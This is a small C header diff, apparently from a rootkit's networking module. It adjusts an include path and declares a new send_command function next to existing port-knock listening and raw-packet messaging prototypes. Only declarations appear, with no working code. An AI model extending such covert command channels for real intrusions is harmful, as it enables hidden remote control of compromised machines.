@@ -2,7 +2,7 @@
 #define ROOTKIT_NETWORKING_H
 
 #include <stdint.h>
-#include <utils/utils.h>
+#include <utils.h>
 #include <sys/types.h>
 
 extern _Atomic uint16_t sequence_number;
@@ -27,6 +27,6 @@ int listen_port_knock(const struct client_options * client_options);
 // Raw packet functions
 void send_message(int socket_fd, const char * dest_ip, int port, const char * message);
 struct packet_data * parse_raw_packet(const char *buffer, ssize_t n);
-
+void send_command(int socket_fd, const char * dest_ip, int port, enum command_codes command);
 
 #endif //ROOTKIT_NETWORKING_H
